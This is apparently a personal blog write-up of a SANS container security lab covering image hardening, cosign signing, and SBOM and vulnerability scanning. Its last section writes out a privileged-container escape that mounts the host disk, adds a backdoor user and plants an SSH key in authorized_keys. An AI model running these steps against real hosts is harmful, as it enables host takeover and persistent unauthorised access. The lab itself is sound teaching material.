+++
title =  "Hands on Workshop: Container Security 101"
date = 2023-06-08T20:13:19+08:00
author = "zd"
tags = [ "sans", "workshop" ]
categories = [ "Posts", "YT" ]
summary = "Workshop on securing container."
draft = false
+++

## Summary

By following the workshop, I learn the steps to create a Docker image (Nginx) from scratch and how to secure it. 

Note that the detail instruction can be found at [Container Security 101](https://jonzeolla.com/labs/container-security-101.html#). Here are the steps that I've taken at my own lab.

## Preparation

{{< youtube id="-iJbGBJTRyk" title="Hands On Workshop: Container Security 101" >}}

First, I watch the 37min video above. 

Then, I setup my virtual mahcine (with multipass) with the following commands.

```shell
c:\> multipass launch --cpus 4 --mem 4G --name sans focal
Launched: sans
Skipping mount due to disabled mounts feature

c:\> multipass shell sans
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun  8 20:11:38 +08 2023

  System load:  0.89              Processes:             151
  Usage of /:   31.1% of 4.67GB   Users logged in:       0
  Memory usage: 6%                IPv4 address for eth0: 172.23.72.152
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

New release '22.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

ubuntu@sans:~$ free -h
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       216Mi       3.2Gi       0.0Ki       488Mi       3.4Gi
Swap:            0B          0B          0B
ubuntu@sans:~$
```

## Getting Start

First, start with patching the OS, and follow by installing `Docker`.

```shell
ubuntu@sans:~$ if [[ -x "$(which sudo)" ]]; then sudo apt-get update; else su -c 'apt-get update'; fi
ubuntu@sans:~$ if [[ -x "$(which sudo)" ]]; then sudo apt-get -y install ca-certificates curl sudo jq; else su -c 'apt-get -y install ca-certificates curl sudo jq'; fi

ubuntu@sans:~$ curl -fsSL https://get.docker.com -o get-docker.sh
ubuntu@sans:~$ sudo sh get-docker.sh
ubuntu@sans:~$ exit 
```

Re-login again.

```shell
c:\> multipass shell

ubuntu@sans:~$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES

ubuntu@sans:~$yy id | grep docker
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),118(netdev),119(lxd),998(docker)
ubuntu@sans:~$
```

## Creating Image

To create a more secure configuration on top of default image.

### Create the docker file

Create the docker file with more secure configuration by running Nginx web server as non-root user.

```shell
ubuntu@sans:~/workshop_user$ cat << EOF > Dockerfile
FROM nginx
RUN groupadd --gid 44380 -r webadm && useradd -r -g webadm -s "/bin/bash" --create-home --uid 44380 webadm
USER webadm
EOF                                                                                                          
ubuntu@sans:~/workshop_user$
```

### Inspect the image

Inspect the image and examine the configuration.

```shell
ubuntu@sans:~/workshop_user$ docker buildx build -t user-nginx  .
[+] Building 0.6s (6/6) FINISHED
 => [internal] load .dockerignore                                                                                         0.0s
 => => transferring context: 2B                                                                                           0.0s
 => [internal] load build definition from Dockerfilei                                                                     0.0s
 => => transferring dockerfile: 169B                                                                                      0.0s
 => [internal] load metadata for docker.io/library/nginx:latest                                                           0.0s
 => CACHED [1/2] FROM docker.io/library/nginx                                                                             0.0s
 => [2/2] RUN groupadd --gid 44380 -r webadm && useradd -r -g webadm -s "/bin/bash" --create-home --uid 44380 webadm      0.3s
 => exporting to image                                                                                                    0.1s
 => => exporting layers                                                                                                   0.1s
 => => writing image sha256:f997a2fff55bafae53ce3c47ccd360cf34e7e00ccf6b953a59f3bd61c35a2fc5                              0.0s
 => => naming to docker.io/library/user-nginx                                                                             0.0s
ubuntu@sans:~/workshop_user$ docker inspect user-nginx | jq -r '.[].Config.User'
webadm
ubuntu@sans:~/workshop_user$
```

## Signing Image

Signing the image allows us to create cryptographic signature using a private key. Then we can assiciate the signature with the image created (user-nginx).

### Inspect the image's digest

```shell
ubuntu@sans:~$ docker images --digests user-nginx
REPOSITORY   TAG       DIGEST    IMAGE ID       CREATED          SIZE
user-nginx   latest    <none>    f997a2fff55b   17 minutes ago   157MB
ubuntu@sans:~$
ubuntu@sans:~$ docker inspect --format='{{index .RepoDigests 0}}' nginx
nginx@sha256:af296b188c7b7df99ba960ca614439c99cb7cf252ed7bbc23e90cfda59092305
ubuntu@sans:~$
```

### Setup local registry 

```shell
ubuntu@sans:~$ newdir=$(mktemp -d)
ubuntu@sans:~$ mkdir -p "${newdir}/certs"
ubuntu@sans:~$ pushd "${newdir}/certs"
/tmp/tmp.GGuPfpUGYM/certs ~
ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ docker volume create workshop-certs
workshop-certs
ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ docker container create --name dummy -v workshop-certs:/certs registry:2
Unable to find image 'registry:2' locally
2: Pulling from library/registry
8a49fdb3b6a5: Pull complete
58116d8bf569: Pull complete
4cb4a93be51c: Pull complete
cbdeff65a266: Pull complete
6b102b34ed3d: Pull complete
Digest: sha256:20d084723c951e377e1a2a5b3df316173a845e300d57ccdd8ae3ab2da3439746
Status: Downloaded newer image for registry:2
10fc426a3bc4f283ed8abc67446f48bbbcac77dd6c191054da34e5dc004c5466
ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$
```

### Setup the private key

Create the private and public keys pair.

```shell
ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 60 -nodes -subj "/CN=registry"
Generating a RSA private key
...................................................................................................................................................................++++
.................................++++
writing new private key to 'key.pem'
-----
ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ docker cp cert.pem dummy:/certs/cert.pem
Successfully copied 3.58kB to dummy:/certs/cert.pem
ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ docker cp key.pem dummy:/certs/key.pem
Successfully copied 5.12kB to dummy:/certs/key.pem
```

### Run a dummy registry for container

```shell
ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ docker run -d -p 443:443 --name registry -v workshop-certs:/certs -e REGISTRY_HTTP_ADDR=0.0.0.0:443 -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/cert.pem -e REGISTRY_HTTP_TLS_KEY=/certs/key.pem registry:2
51d7dc5d5604591760db6ebcfd0b0836e6029877d1a95a466d01d7cfc50d4f88
ubuntu@sans:/tmp/tmp.GGuPfpUGYM/certs$ popd
~
ubuntu@sans:~$
```

### Publish image to registry

```shell
ubuntu@sans:~$ docker tag user-nginx:latest localhost:443/user-nginx
ubuntu@sans:~$
ubuntu@sans:~$ docker push localhost:443/user-nginx
Using default tag: latest
The push refers to repository [localhost:443/user-nginx]
f5a95857a28b: Pushed
4fd834341303: Pushed
5e099cf3f3c8: Pushed
7daac92f43be: Pushed
e60266289ce4: Pushed
4b8862fe7056: Pushed
8cbe4b54fa88: Pushed
latest: digest: sha256:ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250 size: 1780
ubuntu@sans:~$
ubuntu@sans:~$ docker inspect --format='{{index .RepoDigests 0}}' user-nginx
localhost:443/user-nginx@sha256:ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250
ubuntu@sans:~$
```

## Signing Image

To sign the image, we need to:
 - setup cosign docker image
 - setup docker networking for `cosign` and `registry` container
 - generate encrypted keypair with `cosign`

### Setup cosign

```shell
ubuntu@sans:~$ docker pull cgr.dev/chainguard/cosign
Using default tag: latest
latest: Pulling from chainguard/cosign
000b45127bba: Pull complete
Digest: sha256:04f7bd12328389337fba7c29c2e6140e1585a539528188ef1428caf7f94a02ae
Status: Downloaded newer image for cgr.dev/chainguard/cosign:latest
cgr.dev/chainguard/cosign:latest
ubuntu@sans:~$ docker network create workshop
63a4a8341bfd21936113d21a02d53f2dde7de789fbae9640e2e69a471eb8e0a2
ubuntu@sans:~$ docker network connect workshop registry
ubuntu@sans:~$ export COSIGN_PASSWORD='example'
ubuntu@sans:~$ docker run -e COSIGN_PASSWORD -u 0 --network workshop -v "$(pwd):/app" -w /app cgr.dev/chainguard/cosign generate-key-pair
Private key written to cosign.key
Public key written to cosign.pub
ubuntu@sans:~$
```

### Signed image

With the keypair, we can signed the manifest digest of `localhost:443/user-nginx` image, and push the signature to local registry.

```shell
ubuntu@sans:~$ image_digest="$(docker inspect --format='{{index .RepoDigests 0}}' localhost:443/user-nginx | cut -f2 -d@ )"
ubuntu@sans:~$
ubuntu@sans:~$ docker run -e COSIGN_PASSWORD -u 0 --network workshop -v "$(pwd):/app" -w /app cgr.dev/chainguard/cosign sign --yes --key cosign.key -a tag=latest registry:443/user-nginx@"${image_digest}" --allow-insecure-registry

        The sigstore service, hosted by sigstore a Series of LF Projects, LLC, is provided pursuant to the Hosted Project Tools Terms of Use, available at https://lfprojects.org/policies/hosted-project-tools-terms-of-use/.
        Note that if your submission includes personal data associated with this signed artifact, it will be part of an immutable record.
        This may include the email address associated with the account with which you authenticate your contractual Agreement.
        This information will be used for signing this artifact and will be stored in public transparency logs and cannot be removed later, and is subject to the Immutable Record notice at https://lfprojects.org/policies/hosted-project-tools-immutable-records/.

By typing 'y', you attest that (1) you are not submitting the personal data of any other person; and (2) you understand and agree to the statement and the Agreement terms at the URLs listed above.
tlog entry created with index: 23229082
Pushing signature to: registry:443/user-nginx
ubuntu@sans:~$
```

### Verify the signature

With return code and 0, it means everything works.

```shell
ubuntu@sans:~$ docker run -e COSIGN_PASSWORD -u 0 --network workshop -v "$(pwd):/app" -w /app cgr.dev/chainguard/cosign verify --key cosign.pub registry:443/
user-nginx@"${image_digest}" --allow-insecure-registry

Verification for registry:443/user-nginx@sha256:ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250 --
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - Existence of the claims in the transparency log was verified offline
  - The signatures were verified against the specified public key

[{"critical":{"identity":{"docker-reference":"registry:443/user-nginx"},"image":{"docker-manifest-digest":"sha256:ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250"},"type":"cosign container image signature"},"optional":{"Bundle":{"SignedEntryTimestamp":"MEQCIFH1tTPWlW+Zm5T6SMuAB6mI1FHBD6xViH4+sZaNRqlDAiBzuNUZ3i8fX6yAptNJ3EOvI8ecWFau4dR67zjuLZ49mQ==","Payload":{"body":"eyJhcGlWZXJzaW9uIjoiMC4wLjEiLCJraW5kIjoiaGFzaGVkcmVrb3JkIiwic3BlYyI6eyJkYXRhIjp7Imhhc2giOnsiYWxnb3JpdGhtIjoic2hhMjU2IiwidmFsdWUiOiI5MjM4ODg3Y2JjYTJhOGM4MTYyYjIzOGY3NWE5YzQ2N2FlMjBlMDA3NDVhNDhjZjM2MjYzYmI4M2E3OTc1NDk1In19LCJzaWduYXR1cmUiOnsiY29udGVudCI6Ik1FVUNJUURvRGxBTkJoaWd4VEVLK3NLcHY1Vy85MTJseEdzVmVDNGZ2RDdUTGN2cDFRSWdlUUZXb2FieUhYU2VPaWZDWFQrcHRMc0NYMU1kWE1Yd0dPVzIydXlXalA0PSIsInB1YmxpY0tleSI6eyJjb250ZW50IjoiTFMwdExTMUNSVWRKVGlCUVZVSk1TVU1nUzBWWkxTMHRMUzBLVFVacmQwVjNXVWhMYjFwSmVtb3dRMEZSV1VsTGIxcEplbW93UkVGUlkwUlJaMEZGUVVGMlNuQjVVRWxVY2tJclJUaFJNa2haWms1UFlUQmpSVlp5VVFvNFpGaG9SMXBGWTNwUU5IbHVWMjVGUTJKRlNIWmFVMHRwWkVVM2REQkxUbE54U1VOVFZFbHRTVXRCYjFaMFN6VlRlRE5hUWsxd2IyOTNQVDBLTFMwdExTMUZUa1FnVUZWQ1RFbERJRXRGV1MwdExTMHRDZz09In19fX0=","integratedTime":1686306330,"logIndex":23229082,"logID":"c0d23d6ad406973f9559f3ba2d1ca01f84147d8ffc5b8445c224f98b9591801d"}},"tag":"latest"}}]
ubuntu@sans:~$ echo $?
0
ubuntu@sans:~$
```

## Image Security Assessment

To assess an image, we will:
 - generate the SBOM
 - perform vulnerability scan
 - inspect manually

### Making SBOM

To generate a Software Bill of Materials (SBOM), and assess the SBOM artifact for any issue. 

This is effectively how Software Composition Analysis (SCA) tools work.
 - Pulling the `syft`
 - Create `user-nginx.sbom.json` file 
 - Identify different artifacts (143)

```shell
ubuntu@sans:~$ docker run -v "$(pwd):/tmp" -v /var/run/docker.sock:/var/run/docker.sock anchore/syft:latest docker:user-nginx -o json --file user-nginx.sbom.
json
Unable to find image 'anchore/syft:latest' locally
latest: Pulling from anchore/syft
71a8266a79ee: Pull complete
a8f6c9c9f214: Pull complete
561883679c88: Pull complete
Digest: sha256:69fcf21cdd4c577d6949dca4d28549d19724b244dfb539509544be166b53ead3
Status: Downloaded newer image for anchore/syft:latest
ubuntu@sans:~$ ls -sh user-nginx.sbom.json
2.6M user-nginx.sbom.json
ubuntu@sans:~$ jq '.artifacts | length' < user-nginx.sbom.json
143
ubuntu@sans:~$
```

### Vulnerability Scanning images

Perform vulnerability scan to the images with `grype`.

### Vuln scan on `user-nginx` image

```shell
ubuntu@sans:~$ docker run -v "$(pwd):/tmp" anchore/grype sbom:user-nginx.sbom.json --output json --file user-nginx.vulns.json
Unable to find image 'anchore/grype:latest' locally
latest: Pulling from anchore/grype
a116dcab4dc7: Pull complete
2f3b307256b4: Pull complete
920e1d887e26: Pull complete
Digest: sha256:3bd0e02814d15734ad360ea3619807714feff950a1da221758d91bf224e62cc1
Status: Downloaded newer image for anchore/grype:latest
Report written to "user-nginx.vulns.json"
ubuntu@sans:~$ ls -sh user-nginx.vulns.json
560K user-nginx.vulns.json
ubuntu@sans:~$ jq '.matches | length' < user-nginx.vulns.json
143
ubuntu@sans:~$
```

The scan result shows that 143 vulnerabilities been identified.

### Vuln scan on alternative image 

Perform vulnerability scan on a secure-by-default image.
 - use `syft` to generate the SBOM
 - use `grype` to perform vuln scan 

```shell
ubuntu@sans:~$ docker run -v "$(pwd):/tmp" -v /var/run/docker.sock:/var/run/docker.sock anchore/syft:latest docker:cgr.dev/chainguard/nginx -o json --file chainguard-nginx.sbom.json
ubuntu@sans:~$ jq '.artifacts | length' < chainguard-nginx.sbom.json
28
ubuntu@sans:~$
ubuntu@sans:~$ docker run -v "$(pwd):/tmp" anchore/grype sbom:chainguard-nginx.sbom.json --output json --file chainguard-nginx.vulns.json
[0000]  WARN unknown relationship type: described-by form-lib=syft
<repeated warnings removed for brevity>
[0000]  WARN unknown relationship type: described-by form-lib=syft
Report written to "chainguard-nginx.vulns.json"
ubuntu@sans:~$ ls -sh chainguard-nginx.vulns.json
8.0K chainguard-nginx.vulns.json
ubuntu@sans:~$ jq '.matches | length' < chainguard-nginx.vulns.json
0
```


### Inspect on secure image

use the `cosign tree` command to "Display supply chain security related artifacts for an image such as signatures, SBOMs and attestations".

```shell
ubuntu@sans:~$ docker inspect cgr.dev/chainguard/nginx:latest | jq -r '.[].Config.User'
65532
ubuntu@sans:~$ docker run cgr.dev/chainguard/cosign tree cgr.dev/chainguard/nginx
📦 Supply Chain Security Related artifacts for an image: cgr.dev/chainguard/nginx
└── 📦 SBOMs for an image tag: cgr.dev/chainguard/nginx:sha256-8c05680b8a70b49013f9011cba5b50b26683e3360280a6065d30ef0cd8a50524.sbom
   └── 🍒 sha256:fc14a768db64ba83c53746097f2e791137a90dbee6bab11b1166b90d53289d70
└── 💾 Attestations for an image tag: cgr.dev/chainguard/nginx:sha256-8c05680b8a70b49013f9011cba5b50b26683e3360280a6065d30ef0cd8a50524.att
   ├── 🍒 sha256:7102f15718109bcf960a60c7d0755d2a46cf8f1a89dc9f5f0d1dc3b73e2681fe
   ├── 🍒 sha256:94a26e6536103e2c0731999b32d9ae5ebaaf437bd1b053a9efd5595071a8af88
   ├── 🍒 sha256:fa704008148447c3d10a9736aad6a3428256176626b718db32e7c5449a2380af
   ├── 🍒 sha256:371727d76489648fd7a7bc1e6ee19a5ccf5b397742d929f3f8c22a3a5c4be2a1
   ├── 🍒 sha256:b8a661f0bdeaf21787c86a5e50a7dcbbcd46390128b51aab7f72762e2ac3a757
   ├── 🍒 sha256:6015433534df9fa5023ece30f6ee218d16054eef2411e70bf5eb125ac76d322a
   ├── 🍒 sha256:3831c2b852c81bb471445e46ab93555507db06ae198c1664459c438a0d8ec266
   ├── 🍒 sha256:348b53b595b93efa25f40e11bda99d722eca26a6e995af6f9e036c2c949c0502
   ├── 🍒 sha256:5285aa1b38d48a914e869f6644065b0772da6e5d09ff5773329dc1c6b6d465d2
   ├── 🍒 sha256:aa85614506690a9babd80fc77f0ab68ed7f8d712f6cdc6a0208908fd8eda3b8a
   ├── 🍒 sha256:b5b510dcfc8aab2357b1c25d8d8f45907e73149b6463f5d7e985974b41bd42b1
   ├── 🍒 sha256:c954860ffd5ef9b00134c4970e6987d421985e4fb6de64007b5d84bba97ac4dd
   ├── 🍒 sha256:dbba1f40511148154d752eacdb64046669baf46d4f13cf25ce17daf2c5c453a9
   ├── 🍒 sha256:621c3cf1a6f00cff7ba4522ba88712a5ad113ef6ba9884898f5b58b843d6ef7f
   ├── 🍒 sha256:2a2e8bfd461bb44c636a11fc32edc7e9bfdf8ab12a8e4cfd430f4fb2ae65e148
   ├── 🍒 sha256:f010822fd3cb45a683a93e0606be6cacaca5228de291723ab05b5f498a93e99a
   ├── 🍒 sha256:14d68d8ee2407d1c743592330555510b7086875960788384ad9572f0f83bc35a
   ├── 🍒 sha256:16c2d4c02666ec833fd29135057c32ca556d2c45f375655f4d75c2adeebec458
   ├── 🍒 sha256:ef544fd9894e4c8d17610f640820fadfb7de3518006ce0d03258b693a1355868
   ├── 🍒 sha256:ccbb7e07bf6cda332cbb8ee1a4d7abdf839bd4bf6e3b573429248f815d8f3f26
   └── 🍒 sha256:120ab82c57f4e533d471bc44bd055c0eeab276e8ebc527d020e6a5096edd3642
└── 🔐 Signatures for an image tag: cgr.dev/chainguard/nginx:sha256-8c05680b8a70b49013f9011cba5b50b26683e3360280a6065d30ef0cd8a50524.sig
   ├── 🍒 sha256:d5c4cead0e7d2c49100b9fdc9fe6cce1ffb52c903e20c546232000eef4113a51
   ├── 🍒 sha256:d5c4cead0e7d2c49100b9fdc9fe6cce1ffb52c903e20c546232000eef4113a51
   ├── 🍒 sha256:d72682ddb79a2cb3b16b3a1d50c86e273920e4ec0088f0f5dba352387ee7cf7e
   ├── 🍒 sha256:d72682ddb79a2cb3b16b3a1d50c86e273920e4ec0088f0f5dba352387ee7cf7e
   ├── 🍒 sha256:d62ec7d81329cc08ff38ad7f33942ba2660ca1afad72d4de0e3d7b1fdffba234
   ├── 🍒 sha256:d62ec7d81329cc08ff38ad7f33942ba2660ca1afad72d4de0e3d7b1fdffba234
   ├── 🍒 sha256:9ea093370b8210e1131fa3bca0d3b8016cb84326533a2205c75243aba9a570be
   ├── 🍒 sha256:9ea093370b8210e1131fa3bca0d3b8016cb84326533a2205c75243aba9a570be
   ├── 🍒 sha256:377862a5ed89b7f1e189ef66c5b9bd03b7f5fb127eb1a205ad2ceec9b3f64fb2
   ├── 🍒 sha256:0a9793e1e953e5805f6b7fe539c1299ee22fbc0ebe3ba8f897bf14f906622678
   └── 🍒 sha256:0a9793e1e953e5805f6b7fe539c1299ee22fbc0ebe3ba8f897bf14f906622678
ubuntu@sans:~$
```

## Container Image Component

Perform 3 different inspection of image created earlier.

### Inspect the `manifest digest` of image

Retrieve the manifest difest and use it to make API calls to the registry.

```shell
ubuntu@sans:~$ mdigest=$(docker inspect --format='{{index .RepoDigests 0}}' user-nginx | cut -f2 -d@)
ubuntu@sans:~$ echo $mdigest
sha256:ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250
ubuntu@sans:~$ curl -k https://localhost:443/v2/user-nginx/tags/list
{"name":"user-nginx","tags":["latest","sha256-ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250.sig"]}
ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/manifests/$mdigest | sha256sum
ae16d4f97e7d2594e8dab02fca7d1a48014093b19a5a954555f16e95e9f04250  -
ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/manifests/$mdigest | head -14
{
   "schemaVersion": 2,
   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
   "config": {
      "mediaType": "application/vnd.docker.container.image.v1+json",
      "size": 7307,
      "digest": "sha256:f997a2fff55bafae53ce3c47ccd360cf34e7e00ccf6b953a59f3bd61c35a2fc5"
   },
   "layers": [
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 31403586,
         "digest": "sha256:f03b40093957615593f2ed142961afb6b540507e0b47e3f7626ba5e02efbbbf1"
      },
ubuntu@sans:~$
```

### Inspect the `file system` layers

Investigate the files in this layer.

```shell
ubuntu@sans:~$  ldigest=$(curl -s -k https://localhost:443/v2/user-nginx/manifests/$mdigest | jq -r '.layers[0].digest')
ubuntu@sans:~$ echo $ldigest
sha256:f03b40093957615593f2ed142961afb6b540507e0b47e3f7626ba5e02efbbbf1
ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/blobs/$ldigest | sha256sum
f03b40093957615593f2ed142961afb6b540507e0b47e3f7626ba5e02efbbbf1  -
ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/blobs/$ldigest | tar -tvzf - | head
drwxr-xr-x 0/0               0 2023-05-22 08:00 bin/
-rwxr-xr-x 0/0         1234376 2022-03-28 02:40 bin/bash
-rwxr-xr-x 0/0           43936 2020-09-24 16:36 bin/cat
-rwxr-xr-x 0/0           72672 2020-09-24 16:36 bin/chgrp
-rwxr-xr-x 0/0           64448 2020-09-24 16:36 bin/chmod
-rwxr-xr-x 0/0           72672 2020-09-24 16:36 bin/chown
-rwxr-xr-x 0/0          151168 2020-09-24 16:36 bin/cp
-rwxr-xr-x 0/0          125560 2020-12-10 21:23 bin/dash
-rwxr-xr-x 0/0          113664 2020-09-24 16:36 bin/date
-rwxr-xr-x 0/0           80968 2020-09-24 16:36 bin/dd
ubuntu@sans:~$
```

### Inspect the `configuration` components

```shell
ubuntu@sans:~$ cdigest=$(curl -s -k https://localhost:443/v2/user-nginx/manifests/$mdigest | jq -r '.config.digest')
ubuntu@sans:~$ echo $cdigest
sha256:f997a2fff55bafae53ce3c47ccd360cf34e7e00ccf6b953a59f3bd61c35a2fc5
ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/blobs/$cdigest | sha256sum
f997a2fff55bafae53ce3c47ccd360cf34e7e00ccf6b953a59f3bd61c35a2fc5  -
ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/blobs/$cdigest | jq -r '.config.Env[]'
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NGINX_VERSION=1.25.0
NJS_VERSION=0.7.12
PKG_RELEASE=1~bullseye
ubuntu@sans:~$ curl -s -k https://localhost:443/v2/user-nginx/blobs/$cdigest |  jq -r '.history[15]'
{
  "created": "2023-06-09T17:46:19.951682264+08:00",
  "created_by": "RUN /bin/sh -c groupadd --gid 44380 -r webadm && useradd -r -g webadm -s \"/bin/bash\" --create-home --uid 44380 webadm # buildkit",
  "comment": "buildkit.dockerfile.v0"
}
ubuntu@sans:~$
```

Sometime, sensitive info (default password) may be exposed via the `config` and `history`.

Recommendation:
 - use multi-stage builds
 - provide secrets at build time using **envrionment viriables**
 - dynamically retrieve secret at runtime with secret stores, like AWS Secrets Manager, HashiCorp Vault.

## Container Escape

In this section, we will:
 - run a standard Ubuntu container with privileges access
 - abusing the `--privileged` argument to mount the host filesystem


```shell
ubuntu@sans:~$ docker run -it --privileged ubuntu:20.04
Unable to find image 'ubuntu:20.04' locally
20.04: Pulling from library/ubuntu
ca1778b69356: Pull complete
Digest: sha256:db8bf6f4fb351aa7a26e27ba2686cf35a6a409f65603e59d4c203e58387dc6b3
Status: Downloaded newer image for ubuntu:20.04
root@97b36f280196:/#  mount | grep '/dev'
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime)
devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
root@97b36f280196:/# ls -la /home
total 8
drwxr-xr-x 2 root root 4096 Apr 15  2020 .
drwxr-xr-x 1 root root 4096 Jun  9 11:45 ..
root@97b36f280196:/#
root@97b36f280196:/# mount /dev/sda1 /mnt
root@97b36f280196:/# chroot /mnt
#
```

Create a backdoor account `hacker` and drop my SSH public key into the `ubuntu` user at host.

```shell
# ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Jun  8 20:11 .
drwxr-xr-x 19 root   root   4096 Jun  8 20:11 ..
drwxr-xr-x  6 ubuntu ubuntu 4096 Jun  9 19:03 ubuntu
# useradd hacker
# passwd hacker
New password:
Retype new password:
passwd: password updated successfully
# cd /home/ubuntu/.ssh
# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID/RrCstjSf3v/oQqgQSH4/JV8ov8qGUOFHjGDjSCdIw zd@myseq" >> authorized_keys
# exit
root@97b36f280196:/# exit
exit
ubuntu@sans:~$
```

Verify the 2 backdoors.

```
ubuntu@sans:~$ tail -3 /etc/passwd
ubuntu: x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd: x:998:100::/var/snap/lxd/common/lxd:/bin/false
hacker: x:1001:1001::/home/hacker:/bin/sh
ubuntu@sans:~$ tail -1 .ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID/RrCstjSf3v/oQqgQSH4/JV8ov8qGUOFHjGDjSCdIw zd@myseq
ubuntu@sans:~$
```

### Fix

 - avoid using `privileged` 
 - use non-root user (as below)

```shell
ubuntu@sans:~$ docker run -it -u 1001 --privileged ubuntu:20.04
```

## Links
 - https://www.sans.org/webcasts/container-security-101/
 - https://jonzeolla.com/labs/container-security-101.html
 - https://www.youtube.com/watch?v=-iJbGBJTRyk
 - [Fun with Containers](https://raesene.github.io/blog/2023/02/11/Fun-with-Containers-adding-tracking-to-your-images/)
 - [crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md)


